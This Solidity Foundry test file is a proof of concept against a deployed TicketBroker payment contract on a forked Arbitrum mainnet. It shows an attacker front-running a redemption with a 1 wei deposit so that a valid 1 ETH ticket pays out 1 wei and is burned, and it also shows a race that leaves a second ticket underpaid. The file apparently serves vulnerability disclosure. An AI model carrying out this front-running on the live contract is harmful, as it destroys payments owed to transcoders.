pragma solidity ^0.8.9;

import "ds-test/test.sol";
import "./base/GovernorBaseTest.sol";
import "contracts/pm/TicketBroker.sol";
import "contracts/pm/mixins/MixinTicketBrokerCore.sol";
import "contracts/pm/mixins/interfaces/MTicketBrokerCore.sol";
import "contracts/rounds/IRoundsManager.sol";
import "./interfaces/ICheatCodes.sol";

interface IBondingManagerExtended {
    function getFirstTranscoderInPool() external view returns (address);
    function getNextTranscoderInPool(address _transcoder) external view returns (address);
}

// forge test --match-contract TicketBrokerDustDepositGriefingPoC --fork-url <ARB_MAINNET_RPC_URL> -vvv
contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
    event WinningTicketTransfer(address indexed sender, address indexed recipient, uint256 amount);
    TicketBroker public constant TICKET_BROKER = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    IRoundsManager public constant ROUNDS_MANAGER = IRoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
    IBondingManagerExtended public constant BONDING_MANAGER =
        IBondingManagerExtended(0x35Bcf3c30594191d53231E4FF333E8A770453e40);

    uint256 senderPrivateKey = 0xb0b;
    address sender;
    address victimTranscoder;
    address attacker;

    function setUp() public {
        sender = CHEATS.addr(senderPrivateKey);
        victimTranscoder = BONDING_MANAGER.getFirstTranscoderInPool();
        attacker = newAddr();
        CHEATS.deal(sender, 2 ether);
        CHEATS.deal(attacker, 0.1 ether);
    }

    function testDustDepositGriefing() public {
        // The sender's deposit is 0
        (MixinTicketBrokerCore.Sender memory info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);

        // The sender's reserve is 0
        assertEq(TICKET_BROKER.getReserveInfo(sender).fundsRemaining, 0);

        // A valid ticket exists for the victim
        (MTicketBrokerCore.Ticket memory ticket, bytes memory sig, uint256 rand) = _createSignedTicket(
            victimTranscoder,
            sender,
            1 ether
        );

        // The attacker frontruns victim's transaction
        CHEATS.prank(attacker);
        TICKET_BROKER.fundDepositAndReserveFor{ value: 1 wei }(sender, 1 wei, 0);

        // Sanity-check: The sender now has 1 wei deposit
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 1 wei);

        // Consequence 1: The victim now expected to receive 1 wei instead of 1 ETH
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, victimTranscoder, 1 wei);

        // Unchanged victim transcoder transaction
        CHEATS.prank(victimTranscoder);
        TICKET_BROKER.redeemWinningTicket(ticket, sig, rand);

        // Consequence 2: The ticket is marked as used
        assertTrue(TICKET_BROKER.usedTickets(_getTicketHash(ticket)));

        // Sanity-check: The deposit is consumed
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);
    }

    function testRaceConditionPartialPayout() public {
        address transcoder2 = BONDING_MANAGER.getNextTranscoderInPool(victimTranscoder);

        uint256 faceValue = 1 ether;

        // Sender funds 1.5x face value: enough to fully cover one ticket but not two
        CHEATS.prank(sender);
        TICKET_BROKER.fundDepositAndReserve{ value: faceValue + faceValue / 2 }(faceValue + faceValue / 2, 0);

        (MixinTicketBrokerCore.Sender memory info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, faceValue + faceValue / 2);

        // Two valid winning tickets from the same sender to two different transcoders
        (MTicketBrokerCore.Ticket memory ticket1, bytes memory sig1, uint256 rand1) =
            _createSignedTicketWithNonce(victimTranscoder, sender, faceValue, 0);
        (MTicketBrokerCore.Ticket memory ticket2, bytes memory sig2, uint256 rand2) =
            _createSignedTicketWithNonce(transcoder2, sender, faceValue, 1);

        // Transcoder 1 redeems first and receives full face value
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, victimTranscoder, faceValue);
        CHEATS.prank(victimTranscoder);
        TICKET_BROKER.redeemWinningTicket(ticket1, sig1, rand1);

        // Deposit is now 0.5 ETH, not enough to cover the second ticket in full
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, faceValue / 2);

        // Transcoder 2 redeems second ticket and receives only 0.5 ETH despite a valid 1 ETH ticket
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, transcoder2, faceValue / 2);
        CHEATS.prank(transcoder2);
        TICKET_BROKER.redeemWinningTicket(ticket2, sig2, rand2);

        // Ticket 2 is permanently burned despite the partial payout
        assertTrue(TICKET_BROKER.usedTickets(_getTicketHash(ticket2)));
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);
    }

    function _createSignedTicket(
        address _recipient,
        address _sender,
        uint256 _faceValue
    )
        internal
        returns (
            MTicketBrokerCore.Ticket memory,
            bytes memory,
            uint256
        )
    {
        uint256 recipientRand = 987654321;
        uint256 creationRound = ROUNDS_MANAGER.currentRound();
        bytes32 blockHash = ROUNDS_MANAGER.blockHashForRound(creationRound);

        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: _recipient,
            sender: _sender,
            faceValue: _faceValue,
            winProb: type(uint256).max,
            senderNonce: 0,
            recipientRandHash: keccak256(abi.encodePacked(recipientRand)),
            auxData: abi.encodePacked(creationRound, blockHash)
        });

        bytes32 ticketHash = _getTicketHash(ticket);
        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(senderPrivateKey, ethSignedHash);

        return (ticket, abi.encodePacked(r, s, v), recipientRand);
    }

    function _createSignedTicketWithNonce(
        address _recipient,
        address _sender,
        uint256 _faceValue,
        uint256 _nonce
    )
        internal
        returns (
            MTicketBrokerCore.Ticket memory,
            bytes memory,
            uint256
        )
    {
        uint256 recipientRand = 987654321;
        uint256 creationRound = ROUNDS_MANAGER.currentRound();
        bytes32 blockHash = ROUNDS_MANAGER.blockHashForRound(creationRound);

        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: _recipient,
            sender: _sender,
            faceValue: _faceValue,
            winProb: type(uint256).max,
            senderNonce: _nonce,
            recipientRandHash: keccak256(abi.encodePacked(recipientRand)),
            auxData: abi.encodePacked(creationRound, blockHash)
        });

        bytes32 ticketHash = _getTicketHash(ticket);
        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(senderPrivateKey, ethSignedHash);

        return (ticket, abi.encodePacked(r, s, v), recipientRand);
    }

    function _getTicketHash(MTicketBrokerCore.Ticket memory t) internal pure returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    t.recipient,
                    t.sender,
                    t.faceValue,
                    t.winProb,
                    t.senderNonce,
                    t.recipientRandHash,
                    t.auxData
                )
            );
    }
}
